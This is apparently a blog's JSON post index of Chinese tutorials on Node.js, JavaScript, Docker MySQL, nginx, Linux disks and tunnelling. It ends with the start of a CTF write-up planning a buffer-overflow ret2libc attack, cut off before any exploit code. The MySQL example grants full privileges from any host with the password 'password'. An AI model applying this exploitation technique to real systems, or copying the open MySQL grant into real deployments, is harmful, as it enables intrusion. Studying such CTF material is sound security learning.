\"str_a\";\nconsole.log(module.exports); //{ a: 'str_a' }\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports === exports); //true\n```\n\n我們由以上實驗可以得知 `exports` 與 `module.exports` 是指向同一個物件\n\n### 實驗二 (module.exports 指向新物件，斷開關係)\n\nm.js:\n\n```javascript\nexports.a = \"str_a\";\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports); //{ a: 'str_a' }\nmodule.exports = { b: \"str_b\" }; // 此時將 module.exports 重新給定一物件，斷開與 exports 之關係\nconsole.log(exports); //{ a: 'str_a' }\nconsole.log(module.exports); //{ b: 'str_b' }\n```\n\n### 實驗三 (require 是去 module.exports 找模組)\n\nm.js:\n\n```javascript\nmodule.exports = { a: 123 };\nexports.b = \"456\";\n```\n\nmain.js:\n\n```javascript\nlet x = require(\"./m.js\");\nconsole.log(x); //{ a: 123 }\n```\n","tags":["javascript","nodejs","es6"]},{"title":"JavaScript 中物件比大小的依據到底是什麼？","url":"/2019/06/13/","content":"\n## 前言\n\n在 JavaScript 中很多比較的情況非常不符合邏輯，在今年 AIS3 (2019) pre-exam 中，有考到類似概念所引發的錯誤情形。於是記錄一下 JavaScript 在比較物件時到底是依據什麼規則。\n\n## 先看幾種常見的情況\n\n```JavaScript\n> 100 > 10\ntrue\n> 100 > \"10\" //(字串與數字比較，會將字串自動轉為數字來比較)\ntrue\n> \"100\" > \"10\" //(兩者都是字串，實際上是按照字母順序來比較，下面的例子較明顯。並不是將兩個字串轉成數字來比)\ntrue\n> \"abc\" > \"aaa\"\ntrue\n> \"ab\" > \"ac\"\nfalse\n```\n\n## 物件的比較規則\n\n### 來點科普\n\n這次的重點在於兩個物件的比較是依據何者來比較，首先要先知道 JS 有幾種型態\n\n-   null\n-   undefined\n-   boolean\n-   number\n-   string\n-   symbol\n-   object\n\n所以 JS 的型態都在這七種之內。然而，除了 object 以外，都屬於基本型態([primitive data type](https://developer.mozilla.org/zh-TW/docs/Glossary/Primitive))。\n\n### 比較的依據\n\n物件的比較流程為以下(若成功則停，失敗則往下一步)：\n\n1. 呼叫物件內的 valueOf 方法求得 return 值(值必須為 primitive data type)\n\n(若非 primitive data tpye 或是沒有 valueOf 方法則往下)\n\n2. 呼叫 toString 方法求得 return 值(值必須為 primitive data type)\n\n(若非 primitive data tpye 或是沒有 valueOf 方法則往下)\n\n3. 拋出錯誤 (TypeError: Cannot convert object to primitive value)\n\n## 進行實驗\n\n1. 實驗一 (object 內的 valueOf)：\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 123;\n    },\n    toString() {\n        return {};\n    }\n};\nif (obj > 100) console.log(\"great!\");\n//output: great!\n```\n\n2. 實驗二 (valueOf 回傳值不是 primitive data type)：\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return {};\n    },\n    toString() {\n        return 123;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\n//output: great!\n```\n\n3. 實驗三 (valueOf 與 toString 的比較順序)：\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 200;\n    },\n    toString() {\n        return 50;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\nelse console.log(\"QQ\");\n//output: great!\n```\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return 50;\n    },\n    toString() {\n        return 200;\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\nelse console.log(\"QQ\");\n//output: QQ\n```\n\n4. 實驗四（兩者回傳值都非為 primitive data type，拋出錯誤）\n\n```JavaScript\nlet obj = {\n    valueOf() {\n        return {};\n    },\n    toString() {\n        return {};\n    }\n};\n\nif (obj > 100) console.log(\"great!\");\n//output:\n//if (obj > 100) console.log(\"great!\");\n//        ^\n\n//TypeError: Cannot convert object to primitive value\n//    at Object.<anonymous> (/Users/yiyuchang/dev/tmp/article/example.js:10:9)\n//    ......\n```\n\n## 物件預設的 valueOf, toString\n\n```JavaScript\nlet obj = {};\nconsole.log(obj.valueOf());\nconsole.log(obj.toString());\nif (obj == \"[object Object]\") console.log(\"great!\");\n//output:\n//\n//{}\n//[object Object]\n//great!\n```\n\n預設情況下物件是的 valueOf 是回傳空物件 {}，而 toString 則是回傳 [object Object] 字串！\n\n## 結論\n\n希望這篇物件比較的規則說明有幫助到大家，javascipt 真是一門神奇的語言(?) 😄\n","tags":["javascript"]},{"title":"用 serveo 來穿透內網吧","url":"/2019/06/03/","content":"\n有時候會需要暫時的 public ip 來運行環境，比較常見的需求像是\n\n- 分享一個檔案給內網外的朋友\n- 測試環境需要 SSL 憑證 (https)\n- API 的 callback url (需要 https)\n\n雖然要在本地端使用憑證不是不能，只是設定需要一些時間。之前我有這樣的需求時都是透過 [ngrok](https://ngrok.com/)。長久使用下來還算方便，美中不足的點是 ngrok 分享出來的外網網址不是很乾淨\n\n<!-- {% asset_img ngrok.png %} -->\n![1](ngrok.png)\n\n以上的 ngrok 的截圖，分享出來的網址是 `https://50bb33a3.ngrok.io`\n\n然而就在前幾天發現更棒的方案，[serveo](https://serveo.net/)。\n\nserveo 透過 ssh 的方式將一個具有 public ip 的 domain 映射到內網，最棒的地方在於因為是透過 ssh，所以不需要安裝套件，而且映射出來的 domain 還可以自訂！\n\n這樣的服務居然不要收費，真的太佛心了！\n\n他的官網上簡潔明瞭的一句話:\n\n`ssh -R 80:localhost:3000 serveo.net`\n\n簡單一行指令就會自動產生一個 domain 來映射到內網的 3000 port\n\n<!-- {% asset_img serveo.png %} -->\n![2](serveo.png)\n\n也可以用剛才提到的自訂子域名的方式\n\n`ssh -R yiyu:80:localhost:8888 serveo.net`\n\n<!-- {% asset_img serveo_yiyu.png %} -->\n![3](serveo_yiyu.png)\n\n這樣子可以透過 `https://yiyu.serveo.net` 來訪問內網 8888 port\n\n如此一來要分享某一個目錄下的檔案可以先透過 python3 來啟動一個簡單的 HFS\n\n`python3 -m http.server`\n\n然後再穿透內網\n\n`ssh -R yiyu:80:localhost:8000 serveo.net`\n\n(python3 的 http.server 預設開 8000 port)\n\n如此一來人家就可以透過 `https://yiyu.serveo.net` 來取得路徑下的檔案了，非常方便 😄\n","tags":["tools"]},{"title":"在 macOS 上使用 docker 運行 mysql","url":"/2019/05/20/","content":"\n## 前言\n\n想測試 mysql 的指令又不喜歡污染自己的機器，docker 是你的好選擇。但是在 docker 跑 mysql 會遇到一些小雷點，在這邊紀錄一下。\n\n## 正文\n\n起手式，把 mysql 的 image 拉下來\n`docker pull mysql`\n\n之後就可以把 container 跑起來\n`docker run -p 3306:3306 -d --name mysql -e MYSQL_ROOT_PASSWORD=password mysql`\n\nMYSQL_ROOT_PASSWORD 後面那串文字是 root 密碼，在此用 password 舉例，可以換成自己喜歡的\n\n確定跑起來之後，要進去 container 中新建用戶，並且把權限打開 (預設只有 localhost 可以連線)\n\n進入 container:\n`docker exec -it mysql bash`\n\n使用剛才設定的密碼進去 mysql (此指令要在 container 中執行):\n`mysql -uroot -ppasswd`\n\n之後就創建自己想要的用戶，並且設定密碼(在此用 password)。然後要記得把權限打開，除了 localhost 的用戶才連得到\n\n```mysql\nmysql> CREATE USER 'yiyu'@'%' IDENTIFIED BY 'password';\nQuery OK, 0 rows affected (0.03 sec)\n\nmysql> GRANT ALL PRIVILEGES ON * . * TO 'yiyu'@'%';\nQuery OK, 0 rows affected (0.02 sec)\n\nmysql> quit\n```\n\n設定完畢之後就退出 container\n\n再來就會遇到一個雷點!\n\n使用我剛才創建的用戶登入(此指令在 macOS 下執行)\n\n```\nmysql -u yiyu -p\nEnter password:\nERROR 2002 (HY000): Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)\n```\n\n系統會噴一個錯誤出來，而且看起來他是去找 local 的 mysql，但我們的 mysql 不是在 local 而是在 container 之中。\n\n參考了這篇文章:\n\n[Unix domain socket 和 TCP/IP socket 的区别](https://jaminzhang.github.io/network/the-difference-between-unix-domain-socket-and-tcp-ip-socket/)\n\n簡單來說就是如果啟動 mysql 去連 localhost 不會真的走 TCP，而是走預設的 UNIX Domain Socket，這樣子可以讓通訊更快，不用拆解封包。\n\n但是我們需要透過 TCP 來讓 localhost 的 3306 port mapping 到 container 中\n\n所以指令應該要指定走 tcp 連線\n\n`mysql -h localhost --protocol=tcp -u yiyu -p`\n\n```\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 16\nServer version: 8.0.16 MySQL Community Server - GPL\n\nCopyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql>\n```\n\n大功告成！😄\n\n## 後記\n\n也有另外一種方式是不要用 localhost 而用 127.0.0.1\n\n`mysql -h 127.0.0.1 -u yiyu -p`\n\n這樣子也會走 tcp 連線\n\n對於 mysql 來說：\n\n- localhost\n- 空白\n\n就是使用 UNIX Domain Socket\n","tags":["docker","macos","mysql"]},{"title":"nodeJS 中的 fs module 介紹","url":"/2019/05/19/","content":"\n## 前言\n\n在學習任何一個語言一定都會遇到檔案讀寫，在 nodeJS 中的檔案讀寫幾乎都能透過 fs 這個 module 來完成。\n\n而且在 [fs API](https://nodejs.org/api/fs.html) 中有這麼一段話\n\n`All file system operations have synchronous and asynchronous forms.`\n\n對於開發者來說實在是非常棒，不像有些 module 同步與異步是分開成兩個不同的 module。\n\n## 常用操作\n\n### 讀取文件\n\n以下要注意第二個參數要指定編碼，否則印出來會是 raw data 的形式:\n```\n<Buffer 68 65 6c 6c 6f 2c 20 77 6f 72 6c 64 0a>\n```\n\n```javascript\nconst fs = require('fs')\n\n//asynchronous\nfs.readFile('./a.txt', 'utf8', (err, data) => {\n\tconsole.log(data)\n})\n//synchronous\nlet data = fs.readFileSync('./a.txt', 'utf8')\nconsole.log(data)\n```\n\n### 寫入文件\n\n#### writeFile\n寫入文件時，第一個參數為路徑，第二個參數為寫入字串，第三個參數為編碼(預設為 utf-8)\n```javascript\n//asynchronous\nfs.writeFile('./b.txt', 'hi', (err) => {\n\tif (err) throw err\n\tconsole.log('done.')\n}\n//synchronous\nfs.writeFileSync('./b.txt', 'hi')\n```\n\n#### appendFile\n若無此檔案，會自動建立，若有，則附加至尾端\n(第一個參數為路徑，第二個參數為寫入字串，第三個參數為編碼(預設為 utf-8))\n```javascript\nfs.appendFile('./c.txt', 'append txt', (err) => {\n\tif (err) throw err\n\tconsole.log('done.')\n})\n//同樣也有 writeFileSync\ntry {\n\tfs.appendFileSync('message.txt', 'data to append');\n\tconsole.log('The \"data to append\" was appended to file!');\n} catch (err) {\n\t/* Handle the error */\n}\n```\n\n### 開檔案\n\n以上 API 第一參數也可以放 fd，用 open 可以設定詳細權限並且回傳 fd。\n\n```javascript\nfs.open('./a.txt', 'r',(err, fd) => {\n\tif (err) throw err\n\tfs.readFile(fd, 'utf-8', (err, data) => {\n\t\tif (err) throw err\n\t\tconsole.log(data)\n\t})\n})\n//fs.open 也一樣有同步版本，在此不贅述\n```\n\n### 刪檔案\n\n```javascript\nfs.unlink('a.txt', (err) => {\n\tif (err) throw err\n\tconsole.log('deleted.')\n})\n//fs.unlink 也一樣有同步版本，在此不贅述\n```","tags":["nodejs"]},{"title":"實作 facebook OAuth2 登入機制","url":"/2019/05/19/","content":"\n## 前言\n\n前幾週看到 [developer-roadmap](https://github.com/kamranahmedse/developer-roadmap) 中的後端能力技能樹，看到了 OAuth2 這個聽過多次但是沒有實際實作過的驗證機制。於是開啟了自己實作的想法。\n\n完整的做法放在 [oAuth-fb-tutorial](https://github.com/yiyu0x/oAuth2-fb-tutorial) 中，以下紀錄了如何配置以及申請 token。\n\n## setup\n\n0. 首先，先在 [facebook for developers](https://developers.facebook.com/) 註冊應用程式\n\n1. 在此專案目錄下建立 .env, 並且將你的資料填入\n\n```\nfacebook_client_id=\nfacebook_secret_id=\nredirect_uri=\nfacebook_console_id=\n```\n\n`facebook_client_id` 以及 `facebook_secret_id` 在註冊完的應用程式設定中可以找到\n\n<!-- {% asset_img fb-dev.png %} -->\n![1](fb-dev.png)\n\n分別為 `應用程式編號` 以及 `應用程式密鑰`\n\n`redirect_uri` 則填入 ip:3000/facebook/callback ，這邊要注意的是臉書不允許用 http，所以無法只接用 localhost， 這邊推薦大家用 [ngrok](https://ngrok.com/) 來將一個外網網址映射到 localhost:3000/callback/facebook\n\n<!-- {% asset_img ngrok.png %} -->\n![2](ngrok.png)\n\n例如我的 ngrok 幫我映射的 URL 為 https://7bfbb3ed.ngrok.io\n\n則 `redirect_uri` 就填入 `https://7bfbb3ed.ngrok.io/facebook/callback`\n\n除了在 `.env` 填入以外， 也要記得在剛才應用程式設定中填入 `有效的 OAuth 重新導向 URI` 之中\n\n<!-- {% asset_img fb-dev2.png %} -->\n![3](fb-dev2.png)\n\n最後一個 `facebook_console_id` 則是自己的 facebook 帳戶 token\n\n取得方式為:\n\n`curl -X GET \"https://graph.facebook.com/oauth/access_token?client_id={id}&client_secret={id}&grant_type=client_credentials\"`\n\n`client_id` 與 `client_secret` 與 .env 的前兩個欄位相同\n\n2. `npm i`\n   (安裝所需套件)\n\n3. `npm run server`\n   (此時瀏覽 localhost:3000 即可)\n\n## demo\n\n<!-- {% asset_img demo.png %} -->\n![4](demo.png)\n","tags":["oauth2"]},{"title":"telegram-bot API 懶人包","url":"/2019/05/06/","content":"\n## 前言\n這幾天接觸了 telegram API，用來串一些間單的程式並且將結果發送給自己，一開始用的是 [node-telegram-bot-api](https://github.com/yagop/node-telegram-bot-api) ，但昨天發現裡頭有些 event 設計似乎不是這麼直覺。\n\n當初會選擇 node-telegram-bot-api 是因為它在 github 上的 star 比較多。後來依照官方的推薦順序，選擇了 [telegraf](https://telegraf.js.org/#/?id=telegraf)。\n\n以下介紹基本常用的功能，以及自己的小筆記 😊\n\n## 起手式\n\n### 前置作業\n\n```javascript=\nrequire('dotenv').config();\nconst Telegraf = require('telegraf')\nconst bot = new Telegraf(process.env.BOT_TOKEN)\n\nbot.launch()//沒有這行的話，監聽事件都會聽不到內容。但是還是可以主動發送訊息，這行要加在程式尾端\n```\n\n### 常用功能\n\n```javascript=\nbot.start((ctx) => ctx.reply('Welcome')) //點擊 start 區塊後的行為\n\nbot.help((ctx) => ctx.reply('Send me a sticker')) //輸入 /help 後的行為\n\nbot.on('sticker', (ctx) => ctx.reply('👍')) //收到貼圖的行為\n//也可以將 sticker 換成 text 等等不同事件\n\nbot.hears('hi', (ctx) => ctx.reply('Hey there')) //收到某段文字後的行為\n```\n\n## 解析收到的訊息\n\n### 取得用戶資訊\n\n如果 bot 要主動發送訊息給某個用戶，需要知道某個用戶的 userID (group 的話就要知道 groupID)。\n\n我們可以透過解析訊息來得知發送方的資訊(也能透過 http API 介面)：\n```javascript=\nbot.on('message', ({ from: { username, first_name, last_name, id }, reply }) => {\n    let name = first_name + last_name\n    let log = `${name} (${id})`\n    console.log(log)\n    //or\n    console.log(ctx.message.from.id) // user_id\n\tconsole.log(ctx.message.text)    // user_text\n})\n```\n\n### 取得媒體 id\n\n以圖片為例，取得媒體 id。\n\n這邊有一個很重要的觀念， photo 事件也是 message 事件的一種，所以在監聽的時候如果有以下：\n```javascript=\nbot.on('message', () => {})\n```\n也存在於程式中，那麼：\n\n```javascript=\nbot.on('photo', (ctx) => {\n    let file_id = ctx['update']['message']['photo'][0]['file_id']\n    console.log(file_id)\n    //or\n    console.log(ctx.message.photo[0].file_id)\n})\n```\n\n很可能會被第一個監聽事件，提前搶走，造成沒監聽到事件。\n\n## 主動發送訊息\n\n```javascript=\nbot.telegram.sendMessage(process.env.yiyuUID, 'hello, yiyu')\n\nbot.telegram.sendPhoto(process.env.yiyuUID, PHOTO)\n// 這邊的 PHOTO 可以是 image-url 或是 file_id (如果這張圖已經在 telegram server 上的話)\n```\n\n## 小地雷\n\n如上述， message 事件很容易把別人的監聽搶走，因為 message 是小事件的集合。所以當要針對純圖片做處理的時候，可以把 message 換成 text。\n```javascript=\nbot.on('text', (ctx) => {\n    ctx.reply('received')\n})\n```\n用意在於，讓純文字與純圖片各自有自己的監聽範圍，彼此不干擾。\n\n但是如果要處理，`圖片 + 文字` 這種訊息的話，還是需要監聽 message 較適合。\n\n## 例外處理\n\n```javascript=\nbot.catch((err) => {\n  console.log('Ooops', err)\n})\n```","tags":["telegram"]},{"title":"了解nodeJS中的this","url":"/2019/03/29/","content":"\n## \"This\" in nodeJS\n\n以下討論 nodeJS 中的 this，與 javascript 中的 this 不同，請不要搞混了。\n\n## function 外的 this\n\nfunction 外的 this 指向 `module.exports`\n\n```javascript=\nconsole.log('outside: ', this) // {}\n```\n\n```javascript=\nmodule.exports.bar = 3\nconsole.log('outside: ', this) // outside:  { bar: 3 }\n```\n\n切記！這個 this 並不是 `global`\n\n## function 中的 this\n\nfunction 中的 this 才是指向 global\n```javascript=\nfunction foo(argument) {\n\tconsole.log(this)\n}\nfoo()\n```\noutput:\n```\nObject [global] {\n  DTRACE_NET_SERVER_CONNECTION: [Function],\n  DTRACE_NET_STREAM_END: [Function],\n  DTRACE_HTTP_SERVER_REQUEST: [Function],\n  DTRACE_HTTP_SERVER_RESPONSE: [Function],\n  DTRACE_HTTP_CLIENT_REQUEST: [Function],\n  DTRACE_HTTP_CLIENT_RESPONSE: [Function],\n  global: [Circular],\n  process:\n   process {\n     title: 'node',\n     version: 'v10.14.1',\n     versions:\n      { http_parser: '2.8.0',\n        node: '10.14.1',\n        v8: '6.8.275.32-node.36',\n        ...\n        ...\n        ...\n```\n\n如果我們確定 function 中的 this 指向 global，那麼可以透過以下例子在 global 新增屬性\n\n```javascript=\nfunction foo(argument) {\n\tthis.apple = 'A big apple'\n}\nfoo()\nconsole.log(global.apple) //A big apple\n```\n\n## 物件中的 this\n\n再來，我們要討論物件中的 this，這邊就跟其他程式語言較為類似，物件中的 this 指向物件本身。\n\n```javascript=\nclass Foo {\n\tconstructor() {\n\t\tconsole.log(this)\t\n\t}\n}\n\nfunction foo2() {\n\tconsole.log(this)\n}\n\nnew Foo() //Foo {}\nnew foo2() //foo2 {}\n```\n\n## arrow function 中的 this\n\n```javascript=\nlet obj = {\n\tfoo() {\n\t\tconsole.log(this)\n\t},\n\tarr: () => console.log(this)\n\n\n}\n\nobj.foo() //{ foo: [Function: foo], arr: [Function: arr] }\nobj.arr() //{}\n```\n\n要注意的是 arrow function 不會有自己的空間，即使在物件中也是。\n\n這邊 arrow function 的 this 指向的是 `module.exports` (相同於 function 外的 this)\n\n\n## 為何這麼複雜？\n\n為什麼 nodeJS 的 this 要這樣設計？\n\n其實跟作用域有關，在 nodeJS 中，每一個份 js 檔案都是一份 module。然而這樣的設計有利於區隔不同 module 之間的命名空間。\n\n---\n我們在 A 檔案下的 global 屬性，只要 B 引入 A 模組，就可以直接使用 A 檔案的 global 屬性。\n\nA.js\n\n```javascript=\nglobal.bar = 3\nbar2 = 5 // 直接宣告其實就是在 global 之下\nvar bar3 = 7 // 用 var 是在另外一塊作用域之中，只有該檔案看得到\n```\n\nB.js\n\n```javascript=\nrequire('./A')\nconsole.log(global.bar) //3\n//當然 我們也可以這樣使用 bar\nconsole.log(bar) //3\nconsole.log(bar2) //5\nconsole.log(bar3) //ReferenceError: bar3 is not defined\n```\n\n由以上例子又可以知道，其實我們原本直接使用的那些 function，通通都在 global 之中\n\n```javascript=\nconsole.log(global.console.log === console.log) // true\n```\n","tags":["javascript","es6"]},{"title":"了解javesvript中的var","url":"/2019/03/25/","content":"\n記錄幾個月前幫助同學遇到的一個問題，同時了解背後的原理。\n\n```javascript\nfor (var i = 0; i < 5; i++) {\n\tsetTimeout(() => {\n\t\tconsole.log(i)\n\t}, 0)\n}\n```\noutput:\n> 5 5 5 5 5\n\n很多人會認為 output 應該為 `0 1 2 3 4` \n\n要記得 callback function 會被丟到 callback queue 等到 thread 有空才去執行，所以一共有 5 個 callback function 準備要印出 `console.log(i)`。\n\n然而 i 會因為變成 5 而離開迴圈，此時 main thread 已沒有任務可以執行，所以執行 callback queue 中的 5 個 `console.log(i)`，這也是為何 i 的值為 5。\n\n## 解法\n\n### 1. let 取代 var\n\n```javascript\nfor (let i = 0; i < 5; i++) {\n\tsetTimeout(() => {\n\t\tconsole.log(i)\n\t}, 0)\n}\n```\n最間單的解法就是用 let 取代 var，let 會將變數的 scope 鎖定至 block 之中。也就 5 個 `console.log` 都分別擁有自己的 i 變數，並且生命週期只到迴圈結束。\n\n### 2. IIFE\n\n```javascript\nfor (var i = 0; i < 5; i++) {\n\t(function (num) {\n\t\tsetTimeout(() => {\n\t\t\tconsole.log(num)\n\t\t}, 0)\n\t})(i)\n}\n```\nlet 關鍵字是 es6 的新特性，沒有 es6 的時代可以用 IIFE 來解決。IIFE 為一個立即執行的 function，我們可以把 i 丟到一個新的 function 中去執行，這樣做的原因是因為 function 擁有自己獨立的 scope ，如此一來就可以跟外界的 i 區隔。\n\n","tags":["javascript","es6"]},{"title":"如何在Linux上掛載外接硬碟","url":"/2019/03/19/","content":"\n## 前言\n\n最近在練習 `quota` 用來配置每一個使用者的目錄用量， `quota` 是以分割區為單位，發現自己連硬碟掛載都不太熟悉，可以是平常都用遠端機器的緣故，較少掛載經驗，此篇文章記錄一下掛載過程。\n\n## 接上硬碟\n\n無論是實體硬碟，虛擬硬碟，接上後第一步應該確認是否成功讀取\n\n`ls /dev/sd*`\n\n## 分割\n\n確認讀取之後，先用 fdisk 確認硬碟是否正確\n`fdisk -l /dev/sdb`\n\n使用 fdisk 分割硬碟\n`fdisk /dev/sdb`\n\n進入 fdisk 程式後，使用 `m` 來查看指令，並且用 `n` 新增分割區，依提示完成分割 (分割完畢記得用 `w` 寫入分割表)\n\n重新確認是否有分割表出現\n \n`fdisk -l /dev/sdb`\n\n## 格式化\n\n如果想要格式化成 ext4\n\n`mkfs -t ext4 /dev/sdb`\n\n如果想要格式化成 xfs (因爲 `-t` 會出現問題，所以加上參數 `-f` 來強制格式化)\n\n`mkfs.xfs -f /dev/sdb`\n\n## 掛載\n\n掛載之前，要將硬碟資訊寫入在 `/etc/fstab`\n\n設定檔需要 UUID 資訊，可以透過 `blkid` 得知 (我的 sdb UUID 為 f6229601-6fae-4033-9e84-ee0815c9d725)\n\n之後在 /etc/fstab 尾端加上\n\n/etc/fstab:\n```\nUUID=f6229601-6fae-4033-9e84-ee0815c9d725 /DISK2  xfs   defaults,usrquota,grpquota        0 0\n```\n\n`/DISK2` 為我們要掛載的目錄，後面為檔案系統，如果要用 quota 管理目錄，可以加上 `usrquota,grpquota`\n\n之後記得要創建我們需要掛載的目錄，並且掛載它\n\n`mkdir /DISK2`\n\n`mount /DISK2`\n\n可以用 `df` 查看是否掛載成功","tags":["Linux"]},{"title":"如何在 macOS 上自行安裝 openJDK","url":"/2019/03/10/","content":"\n在執行 ghidra 的時候，跳出一條錯誤訊息\n\n`JDK 11+ could not be found and must be manually chosen!`\n\n但是去 oracle java 的網站上只有看到第八版的 JDK\n\n於是找到了 openJDK，以下紀錄如何使用 openJDK 替換目前的 jave 環境\n\n請至 [jdk.java.net](https://jdk.java.net/11/) 下載 JDK11\n\n下載完檔案名稱為 `openjdk-11.0.2_osx-x64_bin.tar.gz` (可以替換成自己下載的版本)\n\n`cd ~/Downloads`\n`tar xf openjdk-11.0.2_osx-x64_bin.tar.gz`\n(順便推薦 zsh，只要下 `x` 指令就能自動解壓縮)\n\n搬移檔案至 JVM\n`sudo mv jdk-11.0.2.jdk /Library/Java/JavaVirtualMachines/`\n\n檢查是否已經替換新的 JAVA 環境\n\n```\n$ java -version\nopenjdk version \"11.0.2\" 2019-01-15\nOpenJDK Runtime Environment 18.9 (build 11.0.2+9)\nOpenJDK 64-Bit Server VM 18.9 (build 11.0.2+9, mixed mode)\n```\n\n```\n$ javac -version\njavac 11.0.2\n```\n\n","tags":["macos"]},{"title":"Line台灣總部參訪心得","url":"/2019/03/09/","content":"\n## TL;DR\n\n前天與台科大資訊安全社的同學們一起參訪台灣 Line 總部，這篇文章簡單記錄心得。\n\n## 正文\n\n{% asset_img line_01.JPG %}\n![1](line_01.JPG)\n\n台灣 Line 總部位於台北市內湖區的辦公大樓內，接待我們的是一位資訊安全的工程師 David。David 讓我們先搭電梯去辦公大樓內的 10 樓等待，途中剛好在 4 樓門就打開了，映入眼簾的是簡約的 Line 字樣，秀在辦公室的毛玻璃上面。當時以為聽錯了，其實是要到 4 樓。後來發現原來 4 ~ 10 樓通通都是 Line 的總部，差別在於不同部門而已。\n\n除了介紹 Line 的公司理念外，全球資安的高階主管([@beist](https://twitter.com/beist))也在現場與我們一起交流，David 介紹說 Beist 是全亞洲第一位打進 Defcon 的 CTF 玩家。聽到這邊眼睛都亮了，第一次與這種等級的人物近距離交流。雖然 Beist 是高階主管，但是看起來年紀很輕，與我們談話就像朋友一般，完全沒有壓力。\n\nDavid 也介紹了 [becks.io](https://becks.io/) 這樣的活動，可以一起交流技術，一邊享用美食，這也算是 Line 的文化之一。其中有介紹到 Line 的資安團隊有各國不同的成員，所以在收 email 的時候，常常會有 4 國語言(英文、韓文、日文、中文)，非常有趣。而且 Line 也鼓勵員工發展自己有興趣的技術，不一定要與工作有直接關係，可以研究自己有興趣的資安議題。\n\n{% asset_img line_02.JPG %}\n![1](line_02.JPG)\n\n工作環境除了有很多的開放空間外，有些地方還有提供升降桌。讓工程師有時候坐久了也能站著 coding，轉換姿勢。也有咖啡 bar 提供員工可以點咖啡或飲品來喝。工程師也沒有固定坐位，想要在哪邊 coding 都可以，自己開心舒服就好，個人非常喜歡這種感覺。\n\nLine 在近期也提供了很多實習機會，David 鼓勵大家不用怕自己還沒畢業或是要當兵不能實習 (Beist 吐槽說韓國當兵要 4 年，台灣 4 個月根本不叫當兵 😂)。Line 願意花時間等，有員工拿到 offer 13 個月後才能上班，Line 正在等待中。面試的話較一般公司嚴格許多，有五道關卡，類似 google。\n\n最後陪同我們的另外一位工程師拿了名片給我們，上面寫著 [Evan Lin](http://www.evanlin.com/)。覺得非常眼熟，於是馬上查了一下，發現是一位自己追蹤非常久工程師，同時也是 [golangtw](https://github.com/golangtw) 的成員。之前看了非常多他寫的文章，此時才發現原來他就在 Line 任職。\n\n整體來說 Line 是一間非常有創造力，且年輕活潑的公司。無論是工作環境或是工作氛圍以及企業理念都非常吸引人。\n","tags":["個人"]},{"title":"在ubuntu上將nginx升級至http/2","url":"/2019/03/06/","content":"\n## 前言\n\n架設 web server 時，把基本設定(virtual host)設定完之外，最麻煩的一件事情就是設定憑證。因為憑證有期限，除了申請憑證外還要排程去定期更新，否則自己忘記憑證到期的話，某一天網站就無法被正常存取了\n\n現在 cloudflare 有提供免費 SSL 服務，只需要按幾個按鍵就搞定了。但 SSL 畢竟是 server side 的事情，給 cloudflare 幫你做，還要開啟 CDN ，如果只是靜態網頁的話沒問題。需要用 reverse proxy 的話，CDN反而是幫倒忙，所以還是非自己設定不可\n\n於是想說趁更新更新憑證，順便幫 nginx 也改走 http/2\n\n## 正文\n\nhttp/2 的優點在此不贅述，要將 nginx 啟動 http2，首先要確認你的 nginx 版本是否大於 `1.9.5`\n\n> $ nginx -v\n> nginx version: nginx/1.14.2\n\n接下來因為 http/2 強制要用 SSL，所以必須要申請憑證\n\n推薦用 `Let's encrypt` 並且用 `certbot` 管理，原因是 certbot 在版本 0.22 以上可以簽發 wildcard 憑證，如此一來就不需要像以前一樣，幫自己的每一個 sub domain 都申請一個憑證\n\n意思就是一張憑證可以在 `*.your-domain` 下使用\n\n## 開工\n\n如果你希望申請憑證的同時幫你設定你的 nginx 設定檔，可以這麼做\n\n(預設是幫你申請 `/etc/nginx/sites-enabled` 下的 domain)\n\n`sudo certbot --nginx`\n\n或是，只需要簽發憑證，其他自己設定就好\n\n`sudo certbot --nginx certonly`\n\n憑證設定好，也確定 nginx 版本沒問題，只需要去 nginx 設定檔啟用 http/2 即可\n\n```\nlisten              443 ssl http2;\nlisten              [::]:443 ssl http2;\n```\n\n另外，不用擔心憑證過期的問題，certbot 會自動定期將憑證更新\n\n想確認的話，以下指令查看 certbot 是否被排程\n\n`systemctl list-timers | grep certbot`\n\n怕更新會有問題也可以自己先確認是否可以正常更新憑證\n\n`sudo certbot renew --dry-run`\n\n拿掉 `--dry-run` 即可手動更新\n\n`sudo certbot renew`\n\n## 驗證\n\n要檢查是否成功啟用，可以用線上工具，像是 [http2-test](https://tools.keycdn.com/http2-test)\n\n或者用 curl 查看回應檔頭是否成功啟用 http/2\n\n`curl -I your-domain`\n","tags":["nginx","linux","http2"]},{"title":"buffer overflow搭配ret2libc之攻擊手法介紹","url":"/2019/03/02/","content":"\n## 前言\n\nbuffer overflow 以下簡稱為 BOF。\n\nBOF 是一個常見的攻擊手法，透過 BOF 可以達成各種不同的目的，像是：\n\n- ret2text\n- ret2shellcode\n- ret2syscall\n- ret2libc\n\n本文將透過 2018-EOF 的 pwn3 來說明 ret2libc 的攻擊手法\n\n## 分析題目\n\n(題目給了一個 ELF 檔案 以及 libc.so.6)\n\n拿到題目第一步，先丟到 IDA 中逆向\n\n<!-- {% asset_img IDA-F5.png %} -->\n![1](IDA-F5.png)\n\n同時查看 ELF 檔案的保護狀態\n\n<!-- {% asset_img checksec.png %} -->\n![2](checksec.png)\n\n這兩個線索加起來(沒有 canary, 使用 read 函數)，第一個想到的就是 BOF\n\n但是程式中並沒有現成的 function 可以用，我們的目的是 get shell\n\n然而在題目給的 libc.so.6 中，發現了 execve\n\n<!-- {% asset_img one_gadget.png %} -->\n![3](one_gadget.png)\n## 困難點\n\n我們並不知道 libc.so.6 load 進 memory 之後的記憶體位置是多少，只知道 execve 相對於 libc.so.6 的 offset 是多少 (0xf1147)\n\n但是程式中有一個 puts 函數，如果我們能利用他來印出 GOT 的 main 位置並且與 